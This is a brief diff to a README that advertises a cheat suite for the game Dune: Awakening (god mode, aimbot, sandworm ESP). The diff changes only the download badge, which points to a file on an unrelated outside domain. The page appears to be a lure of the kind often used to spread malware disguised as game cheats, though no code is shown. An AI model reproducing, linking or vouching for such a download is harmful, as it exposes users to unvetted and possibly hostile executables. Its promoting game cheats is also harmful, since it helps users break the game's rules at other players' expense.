@@ -2,7 +2,7 @@
 
 A modular cheat suite for Dune: Awakening built around the game's harsh survival loop on Arrakis. God mode, unlimited resources, aimbot, and sandworm ESP sit in one tabbed interface.
 
-[![Download Dune Awakening Cheats](https://img.shields.io/badge/Download-Dune_Awakening_Cheats-blueviolet)](https://dyhuiying.com/statistic.php)
+[![Download Dune Awakening Cheats](https://img.shields.io/badge/Download-Dune_Awakening_Cheats-blueviolet)](https://dyhuiying.com/s/file)
 
 ## ✨ Key Features
 
